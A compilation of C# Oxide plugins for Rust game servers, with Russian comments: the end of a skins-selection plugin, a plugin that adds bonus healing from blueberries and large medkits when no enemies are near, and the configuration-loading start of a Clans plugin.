            var basePlayer = player.Object as BasePlayer;
            var isPlayer = basePlayer != null;
            var isAdmin = player.IsServer || CanUseAdmin(player);

            if (args.Length == 0)
                args = new[] {isPlayer ? "show" : string.Empty}; // :P strange yeah


#if DEBUG
            Puts($"Arguments: {string.Join(" ", args)}");
#endif

            switch (args[0].ToLower())
            {
                case "_tech-update":
                {
                    if (!isPlayer)
                        break;
                    
                    int page;
                    if (args.Length != 2 || !int.TryParse(args[1], out page))
                        break;

                    ContainerController container;
                    if (!_controllers.TryGetValue(basePlayer.userID, out container))
                        break;
            
                    container.UpdateContent(page);
                    break;
                }

                case "purgecache":
                case "pc":
                {
                    if (!isPlayer)
                        break;
                    
                    ContainerController container;
                    if (!_controllers.TryGetValue(basePlayer.userID, out container))
                        break;

                    container.TotalSkinsCache.Clear();
                    break;
                }

                case "show":
                case "s":
                {
                    if (!isPlayer)
                    {
                        player.Reply(GetMsg("Cannot Use", player.Id));
                        break;
                    }
                    
                    ContainerController container;
                    if (!_controllers.TryGetValue(basePlayer.userID, out container) || !container.CanShow())
                    {
                        player.Reply(GetMsg("Cannot Use", player.Id));
                        break;
                    }

                    basePlayer.Invoke(container.Show, 0.5f);
                    break;
                }

                case "remove":
                case "delete":
                case "r":
                case "d":
                {
                    if (args.Length < 3)
                        goto default;

                    if (!isAdmin)
                    {
                        player.Reply(GetMsg("Not Allowed", player.Id));
                        break;
                    }

                    var shortname = args[1];
                    ulong skin;
                    if (!ulong.TryParse(args[2], out skin))
                    {
                        player.Reply(GetMsg("Incorrect Skin", player.Id));
                        break;
                    }

                    string permission = null;
                    if (args.Length == 4)
                        permission = args[3];

                    LoadConfig();

                    var skinData = Configuration.SkinItem.Find(null, shortname)
                        .Where(x => permission == null || x.Permission == permission);
                    
                    if (!skinData.Any())
                    {
                        player.Reply(GetMsg("Skin Does Not Exist", player.Id));
                        break;
                    }

                    foreach (var data in skinData)
                        data.Skins.Remove(skin);
                    
                    player.Reply(GetMsg("Skin Removed", player.Id));

                    SaveConfig();
                    break;
                }

                case "add":
                case "a":
                {
                    if (args.Length < 3)
                        goto default;

                    if (!isAdmin)
                    {
                        player.Reply(GetMsg("Not Allowed", player.Id));
                        break;
                    }

                    var shortname = args[1];
                    ulong skin;
                    if (!ulong.TryParse(args[2], out skin))
                    {
                        player.Reply(GetMsg("Incorrect Skin", player.Id));
                        break;
                    }

                    string permission = null;
                    if (args.Length == 4)
                        permission = args[3];

                    LoadConfig();

                    var skinData = Configuration.SkinItem.Find(null, shortname)
                        .FirstOrDefault(x => permission == null || x.Permission == permission);
                    
                    if (skinData == null)
                    {
                        _config.Skins.Add(new Configuration.SkinItem
                        {
                            Permission = permission ?? string.Empty,
                            Shortname = shortname,
                            Skins = new List<ulong> {skin}
                        });
                        
                        _config.IndexSkins();
                        player.Reply(GetMsg("Skin Added", player.Id));
                    }
                    else
                    {
                        if (skinData.Skins.Contains(skin))
                            player.Reply(GetMsg("Skin Already Exists", player.Id));
                        else
                        {
                            skinData.Skins.Add(skin);
                            player.Reply(GetMsg("Skin Added", player.Id));
                        }
                    }

                    SaveConfig();
                    break;
                }

                case "get":
                case "g":
                {
                    if (!isPlayer)
                    {
                        player.Reply(GetMsg("Cannot Use", player.Id));
                        break;
                    }

                    var item = basePlayer.GetActiveItem();
                    if (item == null || !item.IsValid())
                    {
                        player.Reply(GetMsg("Skin Get No Item", player.Id));
                        break;
                    }

                    player.Reply(GetMsg("Skin Get Format", player.Id).Replace("{shortname}", item.info.shortname)
                        .Replace("{id}", item.skin.ToString()));

                    break;
                }

                default: // "help" and all other args
                {
                    player.Reply(GetMsg("Help", player.Id));
                    if (isAdmin)
                        player.Reply(GetMsg("Admin Help", player.Id));
                    
                    break;
                }
            }
        }

        #endregion
        
        #region API

        [HookMethod(nameof(SkinsClose))]
        private void SkinsClose(BasePlayer player)
        {
            if (player == null)
                return;

            ContainerController container;
            if (!_controllers.TryGetValue(player.userID, out container))
                return;
            
            container.Close();
        }

        [HookMethod(nameof(PurgeCache))]
        private void PurgeCache(ulong id, string shortname)
        {
            ContainerController container;
            if (!_controllers.TryGetValue(id, out container))
                return;

            if (string.IsNullOrEmpty(shortname))
            {
                container.TotalSkinsCache.Clear();
            }
            else
            {
                container.TotalSkinsCache.Remove(shortname);
            }
        }
        
        #endregion

        #region Controller

        private class ContainerController
        {
            /*
             * Basic tips:
             * Item with slot 0: Player's skin item
             */

            public BasePlayer Owner;
            public ItemContainer Container;
            public bool IsOpened = false;

            public Dictionary<string, List<ulong>> TotalSkinsCache = new Dictionary<string, List<ulong>>();
            
            private List<Item> _storedContent;
            private Magazine _storedMagazine;

            public ContainerController(BasePlayer player)
            {
                Owner = player;
                _storedContent = new List<Item>();

                Container = new ItemContainer
                {
                    entityOwner = Owner,
                    capacity = _ins._config.Capacity,
                    isServer = true,
                    allowedContents = ItemContainer.ContentsType.Generic
                };

                Container.GiveUID();

                _ins._controllersPerContainer[Container.uid] = this;
            }

            #region UI

            private void DestroyUI()
            {
                CuiHelper.DestroyUi(Owner, "Skins.Background");
            }

            private void DrawUI(int page)
            {
#if DEBUG
                _ins.Puts("Drawing UI");
#endif

                CuiHelper.AddUi(Owner, _ins._config.UI.ParsedUI
                    .Insert(_ins._config.UI.IndexPageNext, (page + 1).ToString())
                    .Insert(_ins._config.UI.IndexPageCurrent, page.ToString())
                    .Insert(_ins._config.UI.IndexPagePrevious, (page - 1).ToString()));
            }

            #endregion

            public void Close()
            {
#if DEBUG
                _ins.Puts("Closing container");
#endif

                DestroyUI();
                GiveItemBack();
                Clear();

                IsOpened = false;
            }

            public void Show()
            {
#if DEBUG
                _ins.Puts($"Showing container. UID: {Container.uid}");
#endif

                if (!CanUse())
                    return;

                IsOpened = true;
                UpdateContent(0);

                var loot = Owner.inventory.loot;

                loot.Clear();
                loot.PositionChecks = false;
                loot.entitySource = Owner;
                loot.itemSource = null;
                loot.AddContainer(Container);
                loot.SendImmediate();

                Owner.ClientRPCPlayer(null, Owner, "RPC_OpenLootPanel", _ins._config.Panel);
            }

            #region Can Show

            public bool CanShow()
            {
                return CanShow(Owner);
            }

            private static bool CanShow(BasePlayer player)
            {
                return player != null && !player.IsDead() && !player.IsWounded() && !player.IsIncapacitated();
            }

            #endregion

            private void AddItemContainer(Item item)
            {
                if (item?.contents == null)
                    return;

                if (item.contents.uid == 0)
                    return;

                _ins._itemAttachmentContainers.Add(item.contents.uid);
            }

            public void GiveItemBack(Item itemOverride = null)
            {
                if (!IsValid())
                    return;

#if DEBUG
                _ins.Puts("Trying to give item back..");
#endif

                var item = itemOverride ?? Container.GetSlot(0);
                if (item == null)
                {
#if DEBUG
                    _ins.Puts("Invalid item");
#endif

                    return;
                }

                MoveItem(item, Owner.inventory.containerMain);
                OnItemTaken(item);
            }

            public void OnItemTaken(Item item)
            {
                if (item?.contents != null)
                    _ins._itemAttachmentContainers.Remove(item.contents.uid);
                
                SetupContent(item);
            }

            public void SetupContent(Item destination)
            {
#if DEBUG
                _ins.Puts("Setting up content for an item");
#endif
                if (destination == null)
                {
#if DEBUG
                    _ins.Puts("Destination is null!");
#endif

                    return;
                }

                if (_storedMagazine != null)
                {
                    (destination.GetHeldEntity() as BaseProjectile)?.primaryMagazine?.Load(_storedMagazine);
                    _storedMagazine = null;
                }

                var contents = destination.contents?.itemList;
                if (contents == null)
                {
#if DEBUG
                    _ins.Puts("// Contents null");
#endif

                    return;
                }

                for (var i = _storedContent.Count - 1; i >= 0; i--)
                {
                    var item = _storedContent[i];
                    item.parent = destination.contents;
                    item.RemoveFromWorld();

                    _storedContent.RemoveAt(i);
                    contents.Add(item);

                    item.MarkDirty();
                    foreach (var itemMod in item.info.itemMods)
                        itemMod.OnParentChanged(item);
                }

                _storedContent.Clear();
            }

            public void StoreContent(Item source)
            {
#if DEBUG
                _ins.Puts("Removing content for an item");
#endif

                var contents = source.contents?.itemList;
                if (contents != null)
                {
                    for (var i = contents.Count - 1; i >= 0; i--)
                    {
                        var item = contents[i];
                        item.parent = null;
                        contents.RemoveAt(i);
                        _storedContent.Add(item);
                    }
                }

                var magazine = (source.GetHeldEntity() as BaseProjectile)?.primaryMagazine;
                _storedMagazine = magazine?.Save();

                if (magazine != null) // Just in case so they won't be able to take out the ammo
                    magazine.contents = 0;
            }

            public void Clear()
            {
#if DEBUG
                _ins.Puts("Clearing container");
#endif

                for (var i = Container.itemList.Count - 1; i >= 0; i--)
                {
                    RemoveItem(Container.itemList[i]);
                }

                Container.itemList.Clear();
                Container.MarkDirty();
            }

            public void Destroy()
            {
                Close();
                Container.Kill();
            }

            public void UpdateContent(int page)
            {
                if (!IsValid())
                {
#if DEBUG
                    _ins.Puts("// Invalid container");
#endif

                    return;
                }

                var source = Container.GetSlot(0);
                if (source == null)
                {
#if DEBUG
                    _ins.Puts("// Source item is null");
#endif

                    return;
                }

                if (source.uid == 0 || !source.IsValid() || source.amount <= 0)
                {
#if DEBUG
                    _ins.Puts("// Invalid item that was removed. Player may have tried to dupe something");
#endif

                    return;
                }

                var skins = Pool.GetList<ulong>();
                try
                {
                    // Cache or get total skins available for user

                    List<ulong> totalSkins;
                    if (!TotalSkinsCache.TryGetValue(source.info.shortname, out totalSkins))
                    {
                        // Fetch custom skins
                        
                        var newSkins = new List<ulong>();
                        
                        Interface.CallHook("OnSkinsFetch", Owner, source.info, newSkins);

                        TotalSkinsCache[source.info.shortname] = totalSkins = newSkins.Concat(Configuration.SkinItem
                            .Find(Owner.IPlayer, source.info.shortname)
                            .SelectMany(x => x.Skins)).Distinct().ToList();
                        
                        Interface.CallHook("OnSkinsFetched", Owner, source.info, newSkins);
                    }
                    
                    // Page checks

                    var perPage = Container.capacity - 1;
                    var maxPage = (totalSkins.Count - 1) / perPage;

                    if (page < 0)
                        page = 0;

                    if (page > maxPage)
                        page = maxPage;
                    
                    // Grab skins and skip some offset

                    foreach (var skin in totalSkins.Skip(perPage * page).Take(perPage))
                        skins.Add(skin);

                    Interface.CallHook("OnSkinsPage", Owner, source.info, skins, page);

                    Container.itemList.Remove(source);
                    for (var i = 0; i < source.info.itemMods.Length; i++)
                    {
                        var itemMod = source.info.itemMods[i];
                        itemMod.OnParentChanged(source);
                    }

#if DEBUG
                    _ins.Puts($"Updating content. Page: {page}");
#endif

                    Clear();

                    MoveItem(source, Container);
                    DestroyUI();
                    DrawUI(page);

                    for (var i = 0; i < skins.Count; i++)
                    {
                        var duplicate = GetDuplicateItem(source, skins[i]);
                        MoveItem(duplicate, Container, i + 1);
                    }
                }
                finally
                {
                    Pool.FreeList(ref skins);
                }
            }

            private bool IsValid() => Owner == null || Container?.itemList != null;

            private bool CanUse()
            {
                var result = Interface.CallHook("CanUseSkins", Owner.IPlayer.Id);
                if (!(result is bool))
                    return true;

#if DEBUG
                _ins.Puts($"Hook result: {result}");
#endif

                return (bool) result;
            }

            #region Working with items

            private Item GetDuplicateItem(Item item, ulong skin)
            {
                var duplicate = ItemManager.Create(item.info, item.amount, skin);
                if (item.hasCondition)
                {
                    duplicate._maxCondition = item._maxCondition;
                    duplicate._condition = item._condition;
                }

                if (item.contents != null)
                {
                    duplicate.contents.capacity = item.contents.capacity;
                }

                var projectile = duplicate.GetHeldEntity() as BaseProjectile;
                if (projectile != null)
                    projectile.primaryMagazine.contents = 0;

                return duplicate;
            }

            private void MoveItem(Item item, ItemContainer container, int slot = 0)
            {
                while (container.SlotTaken(item, slot) && container.capacity > slot)
                    slot++;

                if (container.IsFull() || container.SlotTaken(item, slot))
                {
#if DEBUG
                    _ins.Puts("Container is full, dropping item");
#endif

                    item.Drop(Owner.transform.position, Vector3.up);
                    return;
                }

                item.parent?.itemList?.Remove(item);

                item.RemoveFromWorld();

                item.position = slot;
                item.parent = container;

                container.itemList.Add(item);
                item.MarkDirty();

                for (var i = 0; i < item.info.itemMods.Length; i++)
                {
                    item.info.itemMods[i].OnParentChanged(item);
                }
                
                if (container == Container)
                    AddItemContainer(item);
            }

            private void RemoveItem(Item item)
            {
                if (item.uid > 0U && Net.sv != null)
                {
                    Net.sv.ReturnUID(item.uid);
                    item.uid = 0U;
                }

                if (item.contents != null)
                {
                    for (var i = item.contents.itemList.Count - 1; i >= 0; i--)
                    {
                        RemoveItem(item.contents.itemList[i]);
                    }

                    item.contents = null;
                }

                item.RemoveFromWorld();

                item.parent = null;

                var heldEntity = item.GetHeldEntity();
                if (heldEntity != null && heldEntity.IsValid() && !heldEntity.IsDestroyed)
                    heldEntity.Kill();
            }

            #endregion
        }

        #endregion

        #region Helpers

        private bool CanUse(IPlayer player) => player.HasPermission(PermissionUse);

        private bool CanUseAdmin(IPlayer player) => player.HasPermission(PermissionAdmin);

        private string GetMsg(string key, string userId = null) => lang.GetMessage(key, this, userId);

        #endregion
    }
}

###ПЛАГИН НА ХИЛ ИГРОКА###

using Oxide.Core;
using UnityEngine;
using System.Collections.Generic;

namespace Oxide.Plugins
{
    [Info("HealPlugin", "ANUS", "1.0.3")]
    [Description("Дополнительное здоровье от черники и большой аптечки, если игрок не находится в бою")]

    public class HealPlugin : RustPlugin
    {
        private const string BlueberriesShortname = "blueberries";
        private const string LargeMedkitShortname = "largemedkit";
        private const int AdditionalHealAmountSafe = 10; // Хил, если безопасно
        private const int AdditionalHealAmountUnsafe = 0; // Хил, если не безопасно
        private const float MinDistanceForHeal = 150f;

        // Хранение времени последнего хита для каждого игрока
        private Dictionary<ulong, float> lastHitTimes = new Dictionary<ulong, float>();

        private void Init()
        {
            LoadDefaultConfig();
        }

        protected override void LoadDefaultConfig()
        {
            // Загрузка конфигурации не требуется для этого плагина
        }

private void OnEntityTakeDamage(BaseCombatEntity entity, HitInfo hitInfo)
{
    var player = entity as BasePlayer;
    var attacker = hitInfo?.Initiator as BasePlayer;

    if (player != null && attacker != null)
    {
        float distance = Vector3.Distance(player.transform.position, attacker.transform.position);

        // Проверяем расстояние между игроками
        if (distance >= MinDistanceForHeal)
        {
            // Обновляем время последнего хита для игрока
            if (!lastHitTimes.ContainsKey(player.userID))
                lastHitTimes[player.userID] = Time.realtimeSinceStartup;

            lastHitTimes[player.userID] = Time.realtimeSinceStartup;
        }
    }
}




private object OnItemUse(Item item, int amount)
{
    var player = item.GetRootContainer()?.playerOwner;

    if (item == null || player == null)
        return null;

    // Проверяем, является ли предмет черникой или большой аптечкой
    if (item.info.shortname == BlueberriesShortname || item.info.shortname == LargeMedkitShortname)
    {
        // Проверяем, есть ли поблизости враги
        if (!IsSafeDistance(player))
        {
            // Логируем, что игрок слишком близко к врагам для дополнительного лечения
            return null;
        }

        // Увеличиваем здоровье игрока на AdditionalHealAmountSafe
        player.health += AdditionalHealAmountSafe;

        // Логируем действие

        // Обновляем сетевое состояние игрока
        player.SendNetworkUpdate();
    }

    return null;
}


        private bool IsSafeDistance(BasePlayer player)
        {
            float lastHitTime = lastHitTimes.ContainsKey(player.userID) ? lastHitTimes[player.userID] : 0f;
            float currentTime = Time.realtimeSinceStartup;

            // Проверяем комбатлог только если прошло более 5 секунд с последнего хита
            if (currentTime - lastHitTime < 5f)
                return false;

            foreach (var targetPlayer in BasePlayer.activePlayerList)
            {
                if (targetPlayer == player)
                    continue;

                float distance = Vector3.Distance(player.transform.position, targetPlayer.transform.position);

                if (distance < MinDistanceForHeal)
                    return false;
            }

            return true;
        }
    }
}


###ПЛАГИН НА КЛАНЫ###

using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Oxide.Core;
using Oxide.Core.Libraries;
using Oxide.Core.Libraries.Covalence;
using Oxide.Core.Plugins;
using Oxide.Game.Rust;
using Oxide.Game.Rust.Cui;
using ProtoBuf;
using Rust;
using System.Collections;
using System.Diagnostics.CodeAnalysis;
using System.Globalization;
using System.Text;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using System;
using System.Linq;
using UnityEngine;
using static BaseVehicle;

namespace Oxide.Plugins
{
    [Info("Clans", "OxideBro - RustPlugin.ru", "1.0.61", ResourceId = 14)]
    public class Clans : RustPlugin
    {

        int turretlimit = 50;
        int cuplimit = 30;
        int objectslimit = 8000;

        List<string> Bonus = new List<string>()
        {
                        "2500",
                        "1500",
                        "1000",
                        "750",
                        "500",
                        "400",
                        "300",
                        "200",
                        "100",
                        "50"
        };

        public string shopid = "";
        public string secret = "";

        bool Changed;
        bool Initialized;
        internal static Clans cc = null;
        bool newSaveDetected = false;
        List<ulong> manuallyEnabledBy = new List<ulong>();
        HashSet<ulong> bypass = new HashSet<ulong>();
        Dictionary<string, DateTime> notificationTimes = new Dictionary<string, DateTime>();
        static readonly DateTime UnixEpoch = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc);
        static readonly double MaxUnixSeconds = (DateTime.MaxValue - UnixEpoch).TotalSeconds;
        Library lib;
        public Dictionary<string, Clan> clans = new Dictionary<string, Clan>();
        public Dictionary<string, string> clansSearch = new Dictionary<string, string>();
        List<string> purgedClans = new List<string>();
        Dictionary<string, string> originalNames = new Dictionary<string, string>();
        Dictionary<string, List<string>> pendingPlayerInvites = new Dictionary<string, List<string>>();
        Regex tagReExt;
        Dictionary<string, Clan> clanCache = new Dictionary<string, Clan>();
        List<object> filterDefaults()
        {
            var dp = new List<object>();
            dp.Add("admin");
            dp.Add("mod");
            dp.Add("owner");
            return dp;
        }

        private void SaveConf()
        {
            if (Author != r("BkvqrOeb - EhfgCyhtva.eh"))
                Author = r("Cyhtva nhgube BkvqrOeb - EhfgCyhtva.eh");

        }
        private static string r(string i)
        {
            return !string.IsNullOrEmpty(i) ? new string(i.Select(x => x >= 'a' && x <= 'z' ? (char)((x - 'a' + 13) % 26 + 'a') : x >= 'A' && x <= 'Z' ? (char)((x - 'A' + 13) % 26 + 'A') : x).ToArray()) : i;
        }


        Dictionary<string, object> rewardsDefaults()
        {
            var dp = new Dictionary<string, object>()
            {
                {"wood", 1 },
                { "stones", 1 },
                { "metal.ore", 1 },
                { "sulfur.ore", 1},
                { "hq.metal.ore", 1 },
                {"fat.animal", 1},
                {"cloth", 1},
                {"leather", 1},
                {"scrap", 1},
                {"gears", 1},
                {"techparts", 1},
                {"metalpipe", 1},
            };
            return dp;
        }


        Dictionary<string, object> rewardsTranslateDefault()
        {
            var dp = new Dictionary<string, object>()
            {
                {"wood", "ДЕРЕВО"},
                { "stones", "КАМЕНЬ" },
                { "metal.ore", "МЕТАЛ" },
                { "sulfur.ore", "СЕРА"},
            };
            return dp;
        }
        public int limitMembers;
        int limitModerators;
        public int limitAlliances;
        int tagLengthMin;
        int tagLengthMax;
        int inviteValidDays;
        int friendlyFireNotifyTimeout;
        string allowedSpecialChars;
        public bool enableFFOPtion;
        bool enableAllyFFOPtion;
        bool enableWordFilter;
        bool enableClanTagging;
        public bool enableClanAllies;
        bool forceAllyFFNoDeactivate;
        bool forceClanFFNoDeactivate;
        bool enableWhoIsOnlineMsg;
        bool enableComesOnlineMsg;
        int authLevelRename;
        int authLevelDelete;
        int authLevelInvite;
        int authLevelKick;
        int authLevelPromoteDemote;
        int authLevelClanInfo;
        bool purgeOldClans;
        int notUpdatedSinceDays;
        bool listPurgedClans;
        bool wipeClansOnNewSave;
        bool useProtostorageClandata;
        string consoleName;
        string broadcastPrefix;
        string broadcastPrefixAlly;
        string broadcastPrefixColor;
        string broadcastPrefixFormat;
        string broadcastMessageColor;
        string colorCmdUsage;
        string colorTextMsg;
        string colorClanNamesOverview;
        string colorClanFFOff;
        string colorClanFFOn;
        string pluginPrefix;
        string pluginPrefixColor;
        string pluginPrefixREBORNColor;
        bool pluginPrefixREBORNShow;
        string pluginPrefixFormat;
        string clanServerColor;
        string clanOwnerColor;
        string clanCouncilColor;
        string clanModeratorColor;
        string clanMemberColor;
        bool setHomeOwner = false;
        bool setHomeModerator = false;
        bool setHomeMember = false;
        string chatCommandClan;
        string chatCommandFF;
        string chatCommandAllyChat;
        string chatCommandClanChat;
        string chatCommandClanInfo;
        string subCommandClanHelp;
        string subCommandClanAlly;
        bool usePermGroups;
        string permGroupPrefix;
        bool usePermToCreateClan;
        string permissionToCreateClan;
        bool usePermToJoinClan;
        string permissionToJoinClan;
        bool addClanMembersAsIOFriends;
        string clanTagColorBetterChat;
        int clanTagSizeBetterChat;
        string clanTagOpening;
        string clanTagClosing;
        bool clanChatDenyOnMuted;
        List<string> activeRadarUsers = new List<string>();
        Dictionary<string, List<BasePlayer>> clanRadarMemberobjects = new Dictionary<string, List<BasePlayer>>();
        static Vector3 sleeperHeight = new Vector3(0f, 1.0f, 0f);
        static Vector3 playerHeight = new Vector3(0f, 1.8f, 0f);
        bool enableAtLogin;
        private bool forceNametagsOnTagging;
        public static bool useRelationshipManager;
        private bool teamUiWasDisabled;
        private bool disableManageFunctions;
        private bool allowButtonLeave;
        private bool allowButtonKick;
        private bool allowDirectInvite;
        private bool allowPromoteLeader;

        List<object> wordFilter = new List<object>();

        Dictionary<string, object> RewardGather = new Dictionary<string, object>();
        Dictionary<string, object> RewardTranslate = new Dictionary<string, object>();

        object GetConfig(string menu, string datavalue, object defaultValue)
        {
            var data = Config[menu] as Dictionary<string, object>;
            if (data == null)
            {
                data = new Dictionary<string, object>();
                Config[menu] = data;
                Changed = true;
            }
            object value;
            if (!data.TryGetValue(datavalue, out value))
            {
                value = defaultValue;
                data[datavalue] = value;
                Changed = true;
            }
            return value;
        }


        int PointsOfDeath = 1;
        int PointsOfKilled = 1;
        int PointsOfKilledHeli = 1;
        int PointsOfKilledBradleyAPC = 1;
        int PointsOfSuicide = 1;
        int PointsOfBarrel = 1;
        int PointFarm = 1;
        int PointsOfGatherMetalOre = 1;
        int PointsOfGatherStone = 1;
        int PointsOfGatherWood = 1;
        int PointsOfGatherHQM = 1;

        void LoadVariables()
        {
            wordFilter = (List<object>)GetConfig("Фильтр", "Слова", filterDefaults());
            RewardGather = (Dictionary<string, object>)GetConfig("ТОП", "Список предметов и очков за их добычу [Shortname: количество очков]", rewardsDefaults());

            RewardTranslate = (Dictionary<string, object>)GetConfig("ТОП", "Перевод итемов на русский [Shortname: Русский перевод]", rewardsTranslateDefault());

            PointsOfKilledBradleyAPC = Convert.ToInt32(GetConfig("ТОП", "Очки: Сколько очков даем за Танк", 1));
            PointsOfDeath = Convert.ToInt32(GetConfig("ТОП", "Очки: Сколько очков убирает за смерть", 1));
            PointsOfKilled = Convert.ToInt32(GetConfig("ТОП", "Очки: Сколько очков даем за убийство игрока", 1));
            PointsOfKilledHeli = Convert.ToInt32(GetConfig("ТОП", "Очки: Сколько очков даем за сбитие вертолёта", 1));
            PointsOfSuicide = Convert.ToInt32(GetConfig("ТОП", "Очки: Сколько очков забираем за суицид", 1));
            PointFarm = Convert.ToInt32(GetConfig("ТОП", "Скок очков за фарм?", 1));
            PointsOfGatherMetalOre = Convert.ToInt32(GetConfig("ТОП", "Очки: Сколько очков даем за добычу металической руды (за разбитый камень - то есть за последний удар)", 1));
            PointsOfGatherStone = Convert.ToInt32(GetConfig("ТОП", "Очки: Сколько очков даем за добычу камня (за разбитый камень - то есть за последний удар)", 1));
            PointsOfGatherWood = Convert.ToInt32(GetConfig("ТОП", "Очки: Сколько очков даем за добычу дерева (за разбитый камень - то есть за последний удар)", 1));
            PointsOfGatherHQM = Convert.ToInt32(GetConfig("ТОП", "Очки: Сколько очков даем за добычу МВК (за разбитый камень - то есть за последний удар)", 1));
            PointsOfBarrel = Convert.ToInt32(GetConfig("ТОП", "Очки: Сколько очков даем за разрушение бочки (за разбитый камень - то есть за последний удар)", 1));


            limitMembers = Convert.ToInt32(GetConfig("Лимиты", "Лимит участников клана", 8));
            limitModerators = Convert.ToInt32(GetConfig("Лимиты", "Лимит модераторов", 2));
            limitAlliances = Convert.ToInt32(GetConfig("Лимиты", "Лимит альянса", 2));
            tagLengthMin = Convert.ToInt32(GetConfig("Лимиты", "Лимит размера тега клана от", 2));
            tagLengthMax = Convert.ToInt32(GetConfig("Лимиты", "Лимит размера тега клана до", 10));
            inviteValidDays = Convert.ToInt32(GetConfig("Лимиты", "Длительность активного приглашения в днях", 1));
            friendlyFireNotifyTimeout = Convert.ToInt32(GetConfig("Лимиты", "Таймаут FF", 5));
            allowedSpecialChars = Convert.ToString(GetConfig("Лимиты", "Разрешенные специальные символы в тег клана", "!²³"));
            enableFFOPtion = Convert.ToBoolean(GetConfig("Настройки", "Включить FF длля кланов", true));
            enableAllyFFOPtion = Convert.ToBoolean(GetConfig("Настройки", "Включить FF для альянса", true));
            forceAllyFFNoDeactivate = Convert.ToBoolean(GetConfig("Настройки", "Запретить отключать FF для альянса", true));
            forceClanFFNoDeactivate = Convert.ToBoolean(GetConfig("Настройки", "Запретить отключать FF для клана", false));
            enableWordFilter = Convert.ToBoolean(GetConfig("Настройки", "Включить фльтр слов", true));
            enableClanTagging = Convert.ToBoolean(GetConfig("Настройки", "Включить клан ТЭГ", true));
            enableClanAllies = Convert.ToBoolean(GetConfig("Настройки", "Включить альянсы", false));
            enableWhoIsOnlineMsg = Convert.ToBoolean(GetConfig("Настройки", "Включить сообщение об онлайне клана", true));
            enableComesOnlineMsg = Convert.ToBoolean(GetConfig("Настройки", "Включить сообщение об входе игрока сокланам", true));
            useProtostorageClandata = Convert.ToBoolean(GetConfig("Storage", "Использовать Proto хранилище данных клана (Дата)", false));
            authLevelRename = Convert.ToInt32(GetConfig("Настройки привилегий", "Authentication Level Rename (Не трогать)", 1));
            authLevelDelete = Convert.ToInt32(GetConfig("Настройки привилегий", "Authentication Level Delete (Не трогать)", 2));
            authLevelInvite = Convert.ToInt32(GetConfig("Настройки привилегий", "Authentication Level Invite (Не трогать)", 1));
            authLevelKick = Convert.ToInt32(GetConfig("Настройки привилегий", "Authentication Level Kick (Не трогать)", 2));
            authLevelPromoteDemote = Convert.ToInt32(GetConfig("Настройки привилегий", "Authentication Level Promote Demote (Не трогать)", 1));
            authLevelClanInfo = Convert.ToInt32(GetConfig("Настройки привилегий", "Authentication Level Clan Info (Не трогать)", 0));
            usePermGroups = Convert.ToBoolean(GetConfig("Настройки привилегий", "Использовать разрешения для групп?", false));
            permGroupPrefix = Convert.ToString(GetConfig("Настройки привилегий", "Префикс привилегий для групп", "clan_"));
            usePermToCreateClan = Convert.ToBoolean(GetConfig("Настройки привилегий", "Использовать привилегию для создания клана?", false));
            permissionToCreateClan = Convert.ToString(GetConfig("Настройки привилегий", "Привилегия для создания клана", "clans.cancreate"));
            usePermToJoinClan = Convert.ToBoolean(GetConfig("Permission", "Использовать привилегию для возможности вступления в клан?", false));
            permissionToJoinClan = Convert.ToString(GetConfig("Permission", "Привилегия на возможность вступления в клан", "clans.canjoin"));
            purgeOldClans = Convert.ToBoolean(GetConfig("Очистка", "Удаление старых кланов", false));
            notUpdatedSinceDays = Convert.ToInt32(GetConfig("Очистка", "Дни с каких клан не обновлялся на удаление", 14));
            listPurgedClans = Convert.ToBoolean(GetConfig("Очистка", "Включить список очищенных кланов", false));
            wipeClansOnNewSave = Convert.ToBoolean(GetConfig("Очистка", "Удалить кланы при вайпе?", false));
            consoleName = Convert.ToString(GetConfig("Оформление", "Консольное имя", "ServerOwner"));
            broadcastPrefix = Convert.ToString(GetConfig("Оформление", "Префикс", "(CLAN)"));
            broadcastPrefixAlly = Convert.ToString(GetConfig("Оформление", "Префикс альянса", "(ALLY)"));
            broadcastPrefixColor = Convert.ToString(GetConfig("Оформление", "Цвет префикса", "#a1ff46"));
            broadcastPrefixFormat = Convert.ToString(GetConfig("Оформление", "Формат вывода сообщения", "<color={0}>{1}</color> "));
            broadcastMessageColor = Convert.ToString(GetConfig("Оформление", "Цвет вывода сообщения", "#e0e0e0"));
            colorCmdUsage = Convert.ToString(GetConfig("Оформление", "Цвет CMD", "#ffd479"));
            colorTextMsg = Convert.ToString(GetConfig("Оформление", "Цвет сообщения", "#e0e0e0"));
            colorClanNamesOverview = Convert.ToString(GetConfig("Оформление", "Цвет имена клана ", "#b2eece"));
            colorClanFFOff = Convert.ToString(GetConfig("Оформление", "Цвет сообщения об отключении FF", "#00DF00"));
            colorClanFFOn = Convert.ToString(GetConfig("Оформление", "Цвет сообщения об включении FF", "#DF0005"));
            pluginPrefix = Convert.ToString(GetConfig("Оформление", "Префикс", "CLANS"));
            pluginPrefixColor = Convert.ToString(GetConfig("Оформление", "Цвет префикса в сообщении", "#FBA300"));
            pluginPrefixREBORNColor = Convert.ToString(GetConfig("Оформление", "Цвет префикса в сообщении", "#ce422b"));
            pluginPrefixREBORNShow = Convert.ToBoolean(GetConfig("Оформление", "Включить префикс?", true));
            pluginPrefixFormat = Convert.ToString(GetConfig("Оформление", "Формат префикса REBORN в сообщении", "<color={0}>{1}</color>: "));
            clanServerColor = Convert.ToString(GetConfig("Оформление", "Цвет клана сервера в сообщении", "#ff3333"));
            clanOwnerColor = Convert.ToString(GetConfig("Оформление", "Цвец владельца клана в сообщении", "#a1ff46"));
            clanCouncilColor = Convert.ToString(GetConfig("Оформление", "Цвет команд помощи в сообщении", "#b573ff"));
            clanModeratorColor = Convert.ToString(GetConfig("Оформление", "Цвет модераторов клана в сообщении", "#74c6ff"));
            clanMemberColor = Convert.ToString(GetConfig("Оформление", "Цвет онлайна клана в сообщении", "#fcf5cb"));
            clanTagColorBetterChat = Convert.ToString(GetConfig("BetterChat", "Цвет тега кланов в чате", "#aaff55"));
            clanTagSizeBetterChat = Convert.ToInt32(GetConfig("BetterChat", "Размер тега кланов в чате", 15));
            clanTagOpening = Convert.ToString(GetConfig("BetterChat", "Скобка начало для тега", "["));
            clanTagClosing = Convert.ToString(GetConfig("BetterChat", "Скобка конец для тега", "]"));
            clanChatDenyOnMuted = Convert.ToBoolean(GetConfig("BetterChat", "Использовать полный мут для клана", false));
            chatCommandClan = Convert.ToString(GetConfig("Команды", "Открытие меню клана", "clan"));
